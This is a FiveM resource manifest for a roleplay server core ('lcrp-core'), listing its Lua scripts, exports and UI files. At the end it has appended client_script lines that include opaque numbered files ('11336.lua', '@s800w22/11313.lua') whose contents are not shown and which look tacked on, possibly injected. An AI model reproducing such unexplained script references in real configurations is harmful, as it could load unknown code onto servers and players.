resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'lcrp-core'

server_scripts {
	"config.lua",
	"shared.lua",
	"server/api.lua",
	"server/main.lua",
	"server/functions.lua",
	"server/player.lua",
	--"server/loops.lua",
	"server/events.lua",
	"server/commands.lua",
	"server/debug.lua",
}

client_scripts {
	"config.lua",
	"shared.lua",
	"client/main.lua",
	"client/exports.lua",
	"client/functions.lua",
	"client/loops.lua",
	"client/events.lua",
	"client/debug.lua",
}

exports {
	'isPlayer',
	'Notification',
	'GetPlayers',
	'TaskBar',
}

ui_page {
	'html/ui.html'
}

files {
	'html/ui.html',
	'html/css/main.css',
	'html/js/app.js',
}
client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@s800w22/11313.lua'